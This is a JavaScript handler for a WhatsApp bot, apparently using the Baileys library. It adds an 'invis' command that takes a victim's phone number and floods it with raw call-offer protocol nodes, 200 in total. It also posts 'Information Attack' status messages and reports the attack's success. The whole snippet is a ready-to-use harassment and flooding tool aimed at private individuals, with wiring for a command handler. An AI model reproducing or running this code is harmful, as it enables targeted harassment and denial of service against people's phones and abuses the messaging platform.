async function handleInvisCase(botInstance, message, targetNumber) {
  if (!targetNumber) {
    return botInstance.sendMessage(message.chat, {
      text: "*Format Invalid!*\nUse: invisible 65xxx",
      quoted: message,
    });
  }

  const targetJid = `${targetNumber.replace(/[^0-9]/g, '')}@s.whatsapp.net`;

  // function to send the cc
  async function sendMessageToTarget(jid) {
    try {
      const devices = (await botInstance.getUSyncDevices([jid], false, false)).map(
        ({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`
      );

      await botInstance.assertSessions(devices);

      const callId = crypto.randomBytes(16).toString("hex").slice(0, 32).toUpperCase();
      const callNode = {
        tag: "call",
        attrs: {
          to: jid,
          id: botInstance.generateMessageTag(),
          from: botInstance.user.id,
        },
        content: [
          {
            tag: "offer",
            attrs: {
              "call-id": callId,
              "call-creator": botInstance.user.id,
            },
            content: [
              { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
              { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
            ],
          },
        ],
      };

      await botInstance.sendNode(callNode);
    } catch (error) {
      console.error("Error in sendMessageToTarget:", error);
      throw error;
    }
  }

  // React with 🔍
  await botInstance.sendMessage(message.chat, {
    react: { text: '🔍', key: message.key },
  });

  // Start message
  const startMessage = `*Information Attack*\n* Sender : ${message.pushName}\n* Target : ${targetNumber}\n* Status : Process.....\n`;
  await botInstance.sendMessage(message.chat, {
    text: startMessage,
    quoted: message,
  });

  // Attack loop
  for (let i = 0; i < 50; i++) {
    await sendMessageToTarget(targetJid);
    await sleep(5000); // Sleep for 5 seconds
    await sendMessageToTarget(targetJid);
    await sendMessageToTarget(targetJid);
    await sleep(5000); // Sleep for 5 seconds
    await sendMessageToTarget(targetJid);
  }

  // Success message
  const successMessage = `*Information Attack*\n* Sender : ${message.pushName}\n* Target : ${targetNumber}\n* Status : Success\n`;
  await botInstance.sendMessage(message.chat, {
    text: successMessage,
    quoted: message,
  });

  // React with ✅
  await botInstance.sendMessage(message.chat, {
    react: { text: '✅', key: message.key },
  });
}

// Utility function for sleep
function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// Example usage in the main command handler
// case "invis":
//   {
//     const targetNumber = message.body.split(" ")[1]; // Extract target number from the command
//     await handleInvisCase(botInstance, message, targetNumber);
//   }
//   break;